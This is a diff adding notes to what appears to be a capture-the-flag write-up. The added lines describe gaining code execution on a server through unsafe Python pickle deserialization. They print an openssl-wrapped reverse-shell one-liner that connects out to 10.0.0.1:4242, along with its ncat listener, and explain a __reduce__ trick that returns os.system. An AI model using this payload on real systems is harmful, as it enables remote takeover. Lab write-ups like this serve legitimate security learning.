@@ -64,3 +64,20 @@ on this rabbit hole. https://www.exploit-db.com/exploits/44064 There is another
 button `Activate developer mode`... smh. Idk if that does something. Still no
 idea what to do from here.
 
+Well, the database anonymous exploit was actually the way to go. I just needed
+to try a different connection method. You need to use pickle and pyhton2.7 for
+this to work. Basically do the reverse of what happens on the server. After
+many experiments, they do pickle.load (no base64, just raw).
+
+```
+user@attack$ ncat --ssl -vv -l -p 4242
+
+user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
+```
+
+So we need to put the victim command as the payload for a pickled file. Create
+a class that extends object and in the `__reduce__` method return a tuple
+`(os.system, (payload,))`. This will execute the payload on pickle.load.
+Full script `./expickle/exploit.py`.
+
+Next go to the home directory and cat the flag file.
